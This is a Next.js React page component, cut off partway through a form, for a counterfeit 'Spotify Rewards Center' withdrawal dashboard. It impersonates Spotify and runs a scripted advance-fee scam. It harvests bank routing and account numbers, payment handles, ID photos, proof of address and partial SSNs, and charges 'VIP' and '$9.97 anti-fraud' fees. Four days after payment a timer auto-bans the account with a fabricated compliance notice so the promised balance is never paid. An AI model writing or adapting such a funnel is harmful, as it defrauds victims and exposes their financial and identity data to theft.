'use client';

import React, { useState, useEffect, Suspense } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter, useSearchParams } from 'next/navigation';
import {
  User,
  DollarSign,
  Clock,
  CheckCircle2,
  X,
  ShieldCheck,
  ArrowLeft,
  LogOut,
  Sparkles,
  Lock,
  RefreshCw,
  CreditCard,
  Building2,
  Smartphone,
  AlertCircle,
  Upload,
  FileCheck,
  AlertTriangle,
  Ban,
  ArrowRight,
} from 'lucide-react';
import {
  savePayoutCoordinates,
  recordFunnelEvent,
  unlockOfferBenefitAfterPayment,
  checkAccountFraudBanStatus,
  OfferIdType,
} from '../../../../lib/supabase';

type WithdrawalStage =
  | 'idle'
  | 'pending_2days'
  | 'kyc_required'
  | 'antifraud_fee_required'
  | 'ready_re_request'
  | 'pending_4days'
  | 'account_banned';

function SpotifyProfileContent() {
  const router = useRouter();
  const searchParams = useSearchParams();

  // User Session State
  const [isAuthChecking, setIsAuthChecking] = useState(true);
  const [listenerName, setListenerName] = useState('Verified Listener');
  const [listenerEmail, setListenerEmail] = useState('');
  const [accountBalance, setAccountBalance] = useState<number>(114.93);
  const [releaseDateFormatted, setReleaseDateFormatted] = useState<string>('');
  const [isReleaseDateReached, setIsReleaseDateReached] = useState<boolean>(false);
  const [daysUntilRelease, setDaysUntilRelease] = useState<number>(15);
  const [accountTier, setAccountTier] = useState<'Standard Verified Tier' | 'VIP Gold Tier'>(
    'Standard Verified Tier'
  );

  // Tab & Navigation State
  const [activeTab, setActiveTab] = useState<'profile' | 'request_withdrawal'>('request_withdrawal');

  // Payout Method State
  const [payoutMethodInfo, setPayoutMethodInfo] = useState<{ method: string; target: string }>({
    method: 'Direct Deposit / ACH',
    target: 'Not configured yet',
  });

  // Editable Payout Form State (Used right when requesting withdrawal)
  const [editMethod, setEditMethod] = useState<
    'direct_deposit' | 'zelle' | 'cashapp' | 'paypal' | 'apple_cash'
  >('direct_deposit');
  const [editBankName, setEditBankName] = useState('');
  const [editRoutingNumber, setEditRoutingNumber] = useState('');
  const [editAccountNumber, setEditAccountNumber] = useState('');
  const [editZelleTag, setEditZelleTag] = useState('');
  const [editCashappTag, setEditCashappTag] = useState('');
  const [editPaypalEmail, setEditPaypalEmail] = useState('');
  const [editAppleCashPhone, setEditAppleCashPhone] = useState('');
  const [payoutFormError, setPayoutFormError] = useState<string | null>(null);

  // Multi-Stage Withdrawal Funnel State
  const [withdrawalStage, setWithdrawalStage] = useState<WithdrawalStage>('idle');
  const [twoDaySecondsLeft, setTwoDaySecondsLeft] = useState<number>(48 * 3600);
  const [fourDaySecondsLeft, setFourDaySecondsLeft] = useState<number>(96 * 3600);
  const [upgradedBanner, setUpgradedBanner] = useState<string | null>(null);

  // KYC Upload Form State
  const [kycIdFrontFile, setKycIdFrontFile] = useState<string>('');
  const [kycIdBackFile, setKycIdBackFile] = useState<string>('');
  const [kycAddressFile, setKycAddressFile] = useState<string>('');
  const [kycSsnLast4, setKycSsnLast4] = useState<string>('');
  const [isVerifyingKyc, setIsVerifyingKyc] = useState<boolean>(false);
  const [kycError, setKycError] = useState<string | null>(null);

  const formatDurationCountdown = (totalSecs: number) => {
    const hrs = Math.floor(totalSecs / 3600);
    const mins = Math.floor((totalSecs % 3600) / 60);
    const secs = totalSecs % 60;
    return `${hrs.toString().padStart(2, '0')}h : ${mins
      .toString()
      .padStart(2, '0')}m : ${secs.toString().padStart(2, '0')}s`;
  };

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const isLogged = sessionStorage.getItem('spotify_logged_in') === 'true';
      const storedEmail =
        sessionStorage.getItem('spotify_listener_email') ||
        localStorage.getItem('spotify_current_user');

      if (!isLogged || !storedEmail) {
        router.replace('/spotify/dashboard/login');
        return;
      }

      const emailKey = storedEmail.trim().toLowerCase();

      // Check if account is banned (4 days after post-antifraud withdrawal)
      const banCheck = checkAccountFraudBanStatus(emailKey);
      if (banCheck.isBanned) {
        setListenerEmail(storedEmail);
        setWithdrawalStage('account_banned');
        setIsAuthChecking(false);
        return;
      }

      setIsAuthChecking(false);
      const storedName = sessionStorage.getItem('spotify_listener_name') || 'Verified Listener';
      setListenerName(storedName);
      setListenerEmail(storedEmail);

      // Check if returning from approved Anti-Fraud ($9.97) or VIP checkout
      const upgradedParam = searchParams.get('upgraded') as OfferIdType | null;
      if (upgradedParam) {
        unlockOfferBenefitAfterPayment(emailKey, upgradedParam).catch(() => {});
        if (upgradedParam === 'upsell_antifraud_9_97') {
          setUpgradedBanner(
            'Anti-Fraud Security Verification Approved! +$9.97 USD has been added to your total withdrawal balance. You may now submit your final payout transfer below.'
          );
          setActiveTab('request_withdrawal');
        }
        window.history.replaceState({}, '', '/spotify/dashboard/profile?tab=request_withdrawal');
      }

      const savedBalance = localStorage.getItem('spotify_account_balance_' + emailKey);
      if (savedBalance) {
        const parsedBal = parseFloat(savedBalance);
        if (!isNaN(parsedBal)) setAccountBalance(parsedBal);
      }

      const vipStatus = localStorage.getItem('spotify_vip_7day_' + emailKey) === 'true';
      if (vipStatus) {
        setAccountTier('VIP Gold Tier');
      }

      // Check URL query parameter for active tab
      const tabParam = searchParams.get('tab');
      if (tabParam === 'request_withdrawal' || tabParam === 'profile') {
        setActiveTab(tabParam);
      }

      // Calculate release date ($9 payment date + 15 days standard or 7 days for VIP)
      const storedPaymentDate =
        sessionStorage.getItem('spotify_payment_date') ||
        localStorage.getItem('spotify_payment_date');
      const baseDate = storedPaymentDate ? new Date(storedPaymentDate) : new Date();
      const daysToAdd = vipStatus ? 7 : 15;
      const calcRelease = new Date(baseDate.getTime() + daysToAdd * 24 * 60 * 60 * 1000);
      setReleaseDateFormatted(
        calcRelease.toLocaleDateString('en-US', {
          month: 'short',
          day: 'numeric',
          year: 'numeric',
        })
      );

      const msRemainingToRelease = calcRelease.getTime() - Date.now();
      if (msRemainingToRelease <= 0) {
        setIsReleaseDateReached(true);
        setDaysUntilRelease(0);
      } else {
        setIsReleaseDateReached(false);
        setDaysUntilRelease(Math.ceil(msRemainingToRelease / (24 * 60 * 60 * 1000)));
      }

      // Parse saved payout coordinates if previously entered
      const rawPayout =
        sessionStorage.getItem('spotify_payout_details') ||
        localStorage.getItem('spotify_payout_' + emailKey);
      if (rawPayout) {
        try {
          const parsed = JSON.parse(rawPayout);
          if (parsed.method) setEditMethod(parsed.method);
          if (parsed.bank_name) setEditBankName(parsed.bank_name);
          if (parsed.routing_number) setEditRoutingNumber(parsed.routing_number);
          if (parsed.account_number) setEditAccountNumber(parsed.account_number);
          if (parsed.zelle_tag) setEditZelleTag(parsed.zelle_tag);
          if (parsed.cashapp_tag) setEditCashappTag(parsed.cashapp_tag);
          if (parsed.paypal_email) setEditPaypalEmail(parsed.paypal_email);
          if (parsed.apple_cash_phone) setEditAppleCashPhone(parsed.apple_cash_phone);

          if (parsed.method === 'direct_deposit') {
            const last4 = parsed.account_number ? parsed.account_number.slice(-4) : '••••';
            setPayoutMethodInfo({
              method: 'Direct Deposit (ACH)',
              target: `${parsed.bank_name || 'Bank Account'} (••••${last4})`,
            });
          } else if (parsed.method === 'zelle') {
            setPayoutMethodInfo({ method: 'Zelle', target: parsed.zelle_tag || storedEmail });
          } else if (parsed.method === 'cashapp') {
            setPayoutMethodInfo({ method: 'Cash App', target: parsed.cashapp_tag || '$cashtag' });
          } else if (parsed.method === 'paypal') {
            setPayoutMethodInfo({ method: 'PayPal', target: parsed.paypal_email || storedEmail });
          } else if (parsed.method === 'apple_cash') {
            setPayoutMethodInfo({
              method: 'Apple Cash',
              target: parsed.apple_cash_phone || storedEmail,
            });
          }
        } catch {}
      }

      // Restore & evaluate current Withdrawal Funnel Stage
      const savedStage = (localStorage.getItem('spotify_withdrawal_stage_' + emailKey) ||
        'idle') as WithdrawalStage;
      const requestedAtStr = localStorage.getItem('spotify_withdrawal_requested_at_' + emailKey);
      const finalRequestedAtStr = localStorage.getItem('spotify_final_withdrawal_at_' + emailKey);

      if (savedStage === 'pending_2days' && requestedAtStr) {
        const elapsedMs = Date.now() - new Date(requestedAtStr).getTime();
        const twoDaysMs = 2 * 24 * 60 * 60 * 1000;
        if (elapsedMs >= twoDaysMs) {
          // 2 days have passed -> Cancel transfer & demand KYC!
          localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'kyc_required');
          setWithdrawalStage('kyc_required');
        } else {
          setWithdrawalStage('pending_2days');
          setTwoDaySecondsLeft(Math.max(1, Math.floor((twoDaysMs - elapsedMs) / 1000)));
        }
      } else if (savedStage === 'pending_4days' && finalRequestedAtStr) {
        const elapsedMs = Date.now() - new Date(finalRequestedAtStr).getTime();
        const fourDaysMs = 4 * 24 * 60 * 60 * 1000;
        if (elapsedMs >= fourDaysMs) {
          // 4 days have passed -> Block account for fraud & guideline violations!
          localStorage.setItem('spotify_account_banned_' + emailKey, 'true');
          localStorage.setItem('spotify_account_banned_at_' + emailKey, new Date().toISOString());
          localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'account_banned');
          setWithdrawalStage('account_banned');
        } else {
          setWithdrawalStage('pending_4days');
          setFourDaySecondsLeft(Math.max(1, Math.floor((fourDaysMs - elapsedMs) / 1000)));
        }
      } else {
        setWithdrawalStage(savedStage);
      }
    }
  }, [router, searchParams]);

  // Live countdown ticker for 2-day and 4-day pending transfers
  useEffect(() => {
    if (withdrawalStage !== 'pending_2days' && withdrawalStage !== 'pending_4days') return;
    const emailKey = listenerEmail.trim().toLowerCase();

    const interval = setInterval(() => {
      if (withdrawalStage === 'pending_2days') {
        setTwoDaySecondsLeft((prev) => {
          if (prev <= 1) {
            if (typeof window !== 'undefined' && emailKey) {
              localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'kyc_required');
            }
            setWithdrawalStage('kyc_required');
            return 0;
          }
          return prev - 1;
        });
      } else if (withdrawalStage === 'pending_4days') {
        setFourDaySecondsLeft((prev) => {
          if (prev <= 1) {
            if (typeof window !== 'undefined' && emailKey) {
              localStorage.setItem('spotify_account_banned_' + emailKey, 'true');
              localStorage.setItem(
                'spotify_account_banned_at_' + emailKey,
                new Date().toISOString()
              );
              localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'account_banned');
            }
            setWithdrawalStage('account_banned');
            return 0;
          }
          return prev - 1;
        });
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [withdrawalStage, listenerEmail]);

  // Step 1 -> Step 2: Submit First Withdrawal Request (Enters 2-Day "In Transfer..." state)
  const handleInitiateFirstWithdrawal = async (e: React.FormEvent) => {
    e.preventDefault();
    setPayoutFormError(null);

    if (accountBalance < 500) {
      setPayoutFormError('Minimum withdrawal balance is $500.00 USD.');
      return;
    }

    if (!isReleaseDateReached) {
      setPayoutFormError(
        `Your account withdrawal window opens on ${releaseDateFormatted} (${daysUntilRelease} days remaining).`
      );
      return;
    }

    // Validate payout destination fields
    if (editMethod === 'direct_deposit' && (!editBankName || !editRoutingNumber || !editAccountNumber)) {
      setPayoutFormError('Please fill in your Bank Name, Routing Number, and Account Number.');
      return;
    }
    if (editMethod === 'zelle' && !editZelleTag.trim()) {
      setPayoutFormError('Please enter your registered Zelle phone number or email.');
      return;
    }
    if (editMethod === 'cashapp' && !editCashappTag.trim()) {
      setPayoutFormError('Please enter your Cash App $Cashtag.');
      return;
    }
    if (editMethod === 'paypal' && !editPaypalEmail.trim()) {
      setPayoutFormError('Please enter your PayPal email address.');
      return;
    }
    if (editMethod === 'apple_cash' && !editAppleCashPhone.trim()) {
      setPayoutFormError('Please enter your Apple Cash phone number or Apple ID.');
      return;
    }

    const emailToUse = listenerEmail || 'listener@spotifyrewards.com';
    const emailKey = emailToUse.trim().toLowerCase();

    await savePayoutCoordinates({
      email: emailToUse,
      method: editMethod,
      bank_name: editBankName,
      routing_number: editRoutingNumber,
      account_number: editAccountNumber,
      zelle_tag: editZelleTag,
      cashapp_tag: editCashappTag,
      paypal_email: editPaypalEmail,
      apple_cash_phone: editAppleCashPhone,
    });

    if (editMethod === 'direct_deposit') {
      const last4 = editAccountNumber ? editAccountNumber.slice(-4) : '••••';
      setPayoutMethodInfo({
        method: 'Direct Deposit (ACH)',
        target: `${editBankName || 'Bank Account'} (••••${last4})`,
      });
    } else if (editMethod === 'zelle') {
      setPayoutMethodInfo({ method: 'Zelle', target: editZelleTag });
    } else if (editMethod === 'cashapp') {
      setPayoutMethodInfo({ method: 'Cash App', target: editCashappTag });
    } else if (editMethod === 'paypal') {
      setPayoutMethodInfo({ method: 'PayPal', target: editPaypalEmail });
    } else if (editMethod === 'apple_cash') {
      setPayoutMethodInfo({ method: 'Apple Cash', target: editAppleCashPhone });
    }

    const nowIso = new Date().toISOString();
    if (typeof window !== 'undefined') {
      localStorage.setItem('spotify_withdrawal_requested_at_' + emailKey, nowIso);
      localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'pending_2days');
    }

    setTwoDaySecondsLeft(48 * 3600);
    setWithdrawalStage('pending_2days');
  };

  // Step 3 -> Step 4: Submit KYC Photos -> Unlock $9.97 Anti-Fraud Fee Step
  const handleKycSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setKycError(null);

    if (!kycIdFrontFile || !kycAddressFile) {
      setKycError(
        'Please attach both your Government-Issued Photo ID and Proof of Residential Address.'
      );
      return;
    }

    setIsVerifyingKyc(true);
    const emailKey = listenerEmail.trim().toLowerCase();

    setTimeout(() => {
      setIsVerifyingKyc(false);
      if (typeof window !== 'undefined' && emailKey) {
        localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'antifraud_fee_required');
      }
      setWithdrawalStage('antifraud_fee_required');

      // Log view of Upsell #4 ($9.97 Anti-Fraud Fee) for Admin analytics
      recordFunnelEvent({
        email: listenerEmail,
        full_name: listenerName,
        offer_id: 'upsell_antifraud_9_97',
        offer_name: 'Upsell #4: Taxa Anti-Fraude do Saque ($9.97)',
        amount: 9.97,
        action: 'viewed',
      }).catch(() => {});
    }, 3200);
  };

  // Step 5 -> Step 6: Re-Submit Withdrawal After Paying $9.97 Anti-Fraud Fee -> Enters 4-Day Pending before Ban
  const handleFinalWithdrawalReSubmit = () => {
    const emailKey = listenerEmail.trim().toLowerCase();
    const nowIso = new Date().toISOString();
    if (typeof window !== 'undefined' && emailKey) {
      localStorage.setItem('spotify_final_withdrawal_at_' + emailKey, nowIso);
      localStorage.setItem('spotify_withdrawal_stage_' + emailKey, 'pending_4days');
    }
    setFourDaySecondsLeft(96 * 3600);
    setWithdrawalStage('pending_4days');
  };

  const handleLogout = () => {
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('spotify_logged_in');
    }
    router.push('/spotify/dashboard/login');
  };

  if (isAuthChecking) {
    return (
      <div className="min-h-screen bg-[#121212] flex items-center justify-center text-white text-xs font-mono">
        <div className="flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-[#1db954] animate-ping" />
          <span>Loading Profile Data...</span>
        </div>
      </div>
    );
  }

  // ============================================================================
  // STAGE 6: PERMANENT ACCOUNT BLOCK (4 DAYS AFTER POST-ANTIFRAUD WITHDRAWAL)
  // ============================================================================
  if (withdrawalStage === 'account_banned') {
    return (
      <div className="min-h-screen bg-[#090909] text-white flex items-center justify-center p-4 font-sans selection:bg-red-500 selection:text-white">
        <div className="max-w-lg w-full bg-[#121212] border-2 border-red-500/50 rounded-3xl p-6 sm:p-9 shadow-2xl space-y-6 text-center">
          <div className="w-16 h-16 mx-auto rounded-2xl bg-red-500/15 border border-red-500/40 text-red-500 flex items-center justify-center">
            <Ban className="w-9 h-9 stroke-[2.2]" />
          </div>

          <div className="space-y-2">
            <span className="px-3 py-1 rounded-full bg-red-500/20 border border-red-500/40 text-red-400 text-[10px] font-black uppercase tracking-widest">
              COMPLIANCE ENFORCEMENT DIVISION • CASE #SPT-FRAUD-8921
            </span>
            <h1 className="text-2xl sm:text-3xl font-black text-white tracking-tight pt-1">
              Account Permanently Blocked
            </h1>
            <p className="text-xs sm:text-sm text-red-300 font-semibold">
              Access Revoked Due to Anti-Fraud &amp; Participant Guideline Violations
            </p>
          </div>

          <div className="p-4 sm:p-5 rounded-2xl bg-[#181212] border border-red-500/30 text-left space-y-3 text-xs text-gray-300 leading-relaxed">
            <p className="text-white font-bold">
              Official Notice of Termination ({listenerEmail}):
            </p>
            <p>
              Following the mandatory 96-hour final clearinghouse compliance audit of your withdrawal request, our automated telemetry and identity reconciliation systems flagged severe violations of the <b>Master Listener Agreement</b> accepted upon registration:
            </p>
            <ul className="space-y-1.5 text-[11px] text-red-200/90 pl-1">
              <li>
                • <b>Section 2.2 &amp; 2.3 (Telemetry &amp; Evaluation Anomaly):</b> Irregular acoustic playback patterns and non-compliant response entropy detected across evaluated catalog tracks.
              </li>
              <li>
                • <b>Section 6.3 &amp; 9.1 (Anti-Fraud &amp; Identity Compliance):</b> Clearinghouse security audit failed final anti-fraud risk scoring during outbound settlement verification.
              </li>
            </ul>
            <p className="text-[11px] text-gray-400 pt-1 border-t border-red-500/20">
              In accordance with <b>Section 9.2</b> of the Program Guidelines, your listener account has been permanently de-authorized, all pending escrow balances and royalties have been forfeited, and portal access is permanently denied.
            </p>
          </div>

          <button
            type="button"
            onClick={handleLogout}
            className="w-full py-3.5 px-6 rounded-full bg-red-600 hover:bg-red-500 text-white font-black text-xs uppercase tracking-wider transition-all cursor-pointer"
          >
            Exit Portal
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#121212] text-[#e0e0e0] font-sans antialiased selection:bg-[#1db954] selection:text-black relative">
      {/* Fixed Top Header */}
      <header className="fixed top-0 left-0 right-0 z-40 bg-[#121212] border-b border-[#282828] px-4 sm:px-8 py-3.5 shadow-lg">
        <div className="max-w-6xl mx-auto flex items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <Link
              href="/spotify/dashboard"
              className="inline-flex items-center gap-2 py-1.5 px-3 rounded-full bg-[#1e1e1e] hover:bg-[#282828] text-gray-300 hover:text-white text-xs font-bold transition-all border border-[#2a2a2a]"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back to Dashboard</span>
            </Link>

            <div className="hidden sm:flex items-center gap-2">
              <Image
                src="/spotify-logo.webp"
                alt="Spotify Logo"
                width={28}
                height={28}
                referrerPolicy="no-referrer"
              />
              <span className="text-white font-black text-base tracking-tight">
                Spotify{' '}
                <span className="text-[#1db954] text-xs font-extrabold uppercase ml-1">
                  Rewards Center
                </span>
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className="text-right">
              <span className="text-[10px] text-gray-400 font-extrabold uppercase block leading-none">
                Available Balance
              </span>
              <span className="text-sm sm:text-base font-black text-[#1db954] leading-tight">
                ${accountBalance.toFixed(2)} <span className="text-[10px] text-gray-400">USD</span>
              </span>
            </div>

            <button
              onClick={handleLogout}
              title="Logout"
              className="p-2.5 rounded-full bg-[#1e1e1e] hover:bg-[#282828] text-gray-400 hover:text-white transition-colors border border-[#2a2a2a]"
            >
              <LogOut className="w-4 h-4" />
            </button>
          </div>
        </div>
      </header>

      {/* Main Profile Page Container */}
      <main className="max-w-5xl mx-auto px-4 sm:px-8 pt-24 pb-16 space-y-8">
        {upgradedBanner && (
          <div className="p-4 sm:p-5 rounded-2xl bg-[#0d2415] border border-[#1db954] flex items-center justify-between gap-4 shadow-xl">
            <div className="flex items-center gap-3">
              <CheckCircle2 className="w-6 h-6 text-[#1db954] shrink-0" />
              <p className="text-xs sm:text-sm font-bold text-white">{upgradedBanner}</p>
            </div>
            <button
              type="button"
              onClick={() => setUpgradedBanner(null)}
              className="text-gray-400 hover:text-white p-1"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        )}

        {/* Profile Hero Header Card */}
        <div className="relative overflow-hidden rounded-3xl bg-gradient-to-r from-[#0e2115] via-[#14231a] to-[#181818] border border-[#1db954]/30 p-6 sm:p-8 shadow-2xl">
          <div className="absolute top-0 right-0 w-96 h-96 bg-[#1db954]/10 rounded-full blur-3xl pointer-events-none" />

          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6 relative z-10">
            <div className="flex items-center gap-4 sm:gap-6">
              <div className="relative w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-[#181818] border-2 border-[#1db954] flex items-center justify-center text-white shrink-0 shadow-xl shadow-[#1db954]/20">
                <User className="w-8 h-8 sm:w-10 sm:h-10 text-[#1db954]" />
                <span className="absolute bottom-0 right-0 w-5 h-5 bg-[#1db954] text-black rounded-full flex items-center justify-center font-black text-[10px] border-2 border-[#121212]">
                  ✓
                </span>
              </div>

              <div>
                <div className="flex items-center gap-2 mb-1">
                  <span className="bg-[#1db954] text-black text-[10px] font-black uppercase px-2 py-0.5 rounded-full tracking-wide">
                    {accountTier}
                  </span>
                  <span className="text-xs text-gray-400 font-mono">ID: SPT-948210-US</span>
                </div>
                <h1 className="text-2xl sm:text-3xl font-black text-white tracking-tight">
                  {listenerName}
                </h1>
                <p className="text-xs sm:text-sm text-gray-300 font-mono mt-0.5">
                  {listenerEmail}
                </p>
              </div>
            </div>

            {/* Account Quick Release Date Pill */}
            <div className="bg-black/60 backdrop-blur-md border border-[#282828] p-4 rounded-2xl shrink-0 min-w-[210px] text-left sm:text-right">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider block">
                Withdrawal Unlock Date
              </span>
              <div className="text-xl sm:text-2xl font-black text-[#1db954] mt-0.5">
                {releaseDateFormatted || 'Nov 26, 2026'}
              </div>
              <div className="flex items-center sm:justify-end gap-1.5 text-[11px] text-gray-400 mt-1">
                <Clock className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                <span>
                  {accountTier === 'VIP Gold Tier' ? '7-Day VIP Schedule' : '15-Day Standard Schedule'}
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Clean 2-Segmented Sub-Navigation Bar */}
        <div className="grid grid-cols-2 gap-2 bg-[#181818] p-2 rounded-2xl border border-[#282828] shadow-inner">
          <button
            onClick={() => setActiveTab('request_withdrawal')}
            className={`py-3 px-4 rounded-xl text-xs font-extrabold transition-all flex items-center justify-center gap-2 cursor-pointer ${
              activeTab === 'request_withdrawal'
                ? 'bg-[#1db954] text-black shadow-lg shadow-[#1db954]/25'
                : 'text-gray-400 hover:text-white hover:bg-[#222]'
            }`}
          >
            <DollarSign className="w-4 h-4 shrink-0" />
            <span>Request Withdrawal</span>
          </button>

          <button
            onClick={() => setActiveTab('profile')}
            className={`py-3 px-4 rounded-xl text-xs font-extrabold transition-all flex items-center justify-center gap-2 cursor-pointer ${
              activeTab === 'profile'
                ? 'bg-[#1db954] text-black shadow-lg shadow-[#1db954]/25'
                : 'text-gray-400 hover:text-white hover:bg-[#222]'
            }`}
          >
            <User className="w-4 h-4 shrink-0" />
            <span>Profile &amp; Tier</span>
          </button>
        </div>

        {/* ========================================================================= */}
        {/* TAB: REQUEST WITHDRAWAL (Complete 6-Stage Withdrawal Funnel)              */}
        {/* ========================================================================= */}
        {activeTab === 'request_withdrawal' && (
          <div className="space-y-6 animate-in fade-in duration-300">
            {/* Top Balance & Eligibility Overview */}
            <div className="bg-[#181818] border border-[#282828] rounded-3xl p-6 sm:p-8 text-center space-y-6">
              <span className="text-xs text-gray-400 uppercase font-extrabold tracking-wider block">
                Total Accumulated Royalty Balance
              </span>
              <div className="text-4xl sm:text-5xl font-black text-[#1db954]">
                ${accountBalance.toFixed(2)}{' '}
                <span className="text-lg text-gray-400 font-normal">USD</span>
              </div>

              {/* Progress Bar towards $500.00 Minimum Withdrawal Limit */}
              <div className="max-w-lg mx-auto space-y-2">
                <div className="flex items-center justify-between text-xs font-bold text-gray-300">
                  <span>Minimum Withdrawal Requirement ($500.00 USD)</span>
                  <span className={accountBalance >= 500 ? 'text-[#1db954]' : 'text-amber-400'}>
                    ${accountBalance.toFixed(2)} / $500.00 USD
                  </span>
                </div>
                <div className="w-full bg-[#121212] h-3 rounded-full overflow-hidden border border-[#282828] p-0.5">
                  <div
                    className={`h-full rounded-full transition-all duration-500 ${
                      accountBalance >= 500 ? 'bg-[#1db954]' : 'bg-amber-400'
                    }`}
                    style={{ width: `${Math.min(100, (accountBalance / 500) * 100)}%` }}
                  />
                </div>
                <div className="flex flex-wrap items-center justify-between gap-2 text-[11px] text-gray-400 pt-1">
                  <span>
                    {accountBalance >= 500
                      ? '✓ $500.00 Minimum Balance Reached'
                      : `Requires +$${(500 - accountBalance).toFixed(2)} USD more in evaluations`}
                  </span>
                  <span className={isReleaseDateReached ? 'text-[#1db954] font-bold' : 'text-amber-400 font-bold'}>
                    {isReleaseDateReached
                      ? `✓ Unlock Date Reached (${releaseDateFormatted})`
                      : `Unlocks on ${releaseDateFormatted} (${daysUntilRelease}d left)`}
                  </span>
                </div>
              </div>

              {/* ================================================================= */}
              {/* STAGE 1: IDLE (Waiting for $500 + Release Date OR Ready to Submit) */}
              {/* ================================================================= */}
              {withdrawalStage === 'idle' && (
                <div className="pt-4 border-t border-[#262626] max-w-2xl mx-auto text-left space-y-5">
                  {!isReleaseDateReached || accountBalance < 500 ? (
                    <div className="p-5 rounded-2xl bg-[#121212] border border-[#2a2a2a] text-center space-y-4">
                      <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-400 text-xs font-extrabold">
                        <Lock className="w-3.5 h-3.5" />
                        <span>
                          {accountBalance < 500
                            ? `Minimum Withdrawal is $500.00 USD`
                            : `Scheduled Release Date: ${releaseDateFormatted}`}
                        </span>
                      </div>
                      <p className="text-xs sm:text-sm text-gray-300 max-w-md mx-auto leading-relaxed">
                        {accountBalance < 500 && !isReleaseDateReached
                          ? `Continue evaluating daily tracks until you reach at least $500.00 USD and your account reaches its scheduled release date (${releaseDateFormatted}).`
                          : accountBalance < 500
                          ? `Your release date has arrived! Complete more daily track evaluations to reach the $500.00 USD minimum payout threshold.`
                          : `You have reached the $500.00 USD threshold! Your payout window opens automatically on ${releaseDateFormatted}.`}
                      </p>

                      {accountTier !== 'VIP Gold Tier' && !isReleaseDateReached && (
                        <div className="pt-2">
                          <button
                            type="button"
                            onClick={() => router.push('/payment?offer=upsell_vip_19_90')}
                            className="py-3 px-6 rounded-full bg-amber-400 hover:bg-amber-300 text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-amber-400/20 cursor-pointer inline-flex items-center gap-2"
                          >
                            <Sparkles className="w-4 h-4" />
                            <span>Cut Waiting Time to 7 Days with VIP Pass (+$19.90)</span>
                          </button>
                        </div>
                      )}
                    </div>
                  ) : (
                    /* Eligible to Request First Payout! Show Destination Form + Submit */
                    <form onSubmit={handleInitiateFirstWithdrawal} className="space-y-5">
                      <div className="p-4 rounded-2xl bg-[#0d2215] border border-[#1db954]/40 text-xs text-[#1db954] font-bold flex items-center gap-2.5">
                        <CheckCircle2 className="w-5 h-5 shrink-0" />
                        <span>
                          Your account is eligible for payout! Select where you want to receive your{' '}
                          <b>${accountBalance.toFixed(2)} USD</b> transfer below:
                        </span>
                      </div>

                      <div>
                        <label className="block text-xs font-extrabold text-gray-300 uppercase tracking-wider mb-2.5">
                          Select Payout Method:
                        </label>
                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2">
                          {[
                            { id: 'direct_deposit', label: 'Bank / ACH', icon: Building2 },
                            { id: 'zelle', label: 'Zelle', icon: Smartphone },
                            { id: 'cashapp', label: 'Cash App', icon: DollarSign },
                            { id: 'paypal', label: 'PayPal', icon: CreditCard },
                            { id: 'apple_cash', label: 'Apple Cash', icon: Smartphone },
                          ].map((m) => {
                            const IconComp = m.icon;
                            return (
                              <button
                                key={m.id}
                                type="button"
                                onClick={() => setEditMethod(m.id as any)}
                                className={`py-3 px-2.5 rounded-xl text-xs font-extrabold transition-all border flex flex-col items-center justify-center gap-1.5 cursor-pointer ${
                                  editMethod === m.id
                                    ? 'bg-[#1db954] text-black border-[#1db954]'
                                    : 'bg-[#121212] text-gray-300 border-[#282828] hover:border-gray-500'
                                }`}
                              >
                                <IconComp className="w-4 h-4" />
                                <span>{m.label}</span>
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      <div className="p-5 rounded-2xl bg-[#121212] border border-[#282828] space-y-4">
                        {editMethod === 'direct_deposit' && (
                          <div className="space-y-3">
                            <div>
                              <label className="block text-xs font-semibold text-gray-300 mb-1">
                                Bank Name
                              </label>
                              <input
                                type="text"
                                required
                                value={editBankName}
                                onChange={(e) => setEditBankName(e.target.value)}
                                placeholder="e.g. Chase, Bank of America, Wells Fargo"
                                className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm focus:outline-none focus:border-[#1db954]"
                              />
                            </div>
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                              <div>
                                <label className="block text-xs font-semibold text-gray-300 mb-1">
                                  Routing Number (9 digits)
                                </label>
                                <input
                                  type="text"
                                  required
                                  maxLength={9}
                                  value={editRoutingNumber}
                                  onChange={(e) =>
                                    setEditRoutingNumber(e.target.value.replace(/\D/g, ''))
                                  }
                                  placeholder="021000021"
                                  className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                                />
                              </div>
                              <div>
                                <label className="block text-xs font-semibold text-gray-300 mb-1">
                                  Account Number
                                </label>
                                <input
                                  type="text"
                                  required
                                  value={editAccountNumber}
                                  onChange={(e) =>
                                    setEditAccountNumber(e.target.value.replace(/\D/g, ''))
                                  }
                                  placeholder="Account number"
                                  className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                                />
                              </div>
                            </div>
                          </div>
                        )}

                        {editMethod === 'zelle' && (
                          <div>
                            <label className="block text-xs font-semibold text-gray-300 mb-1">
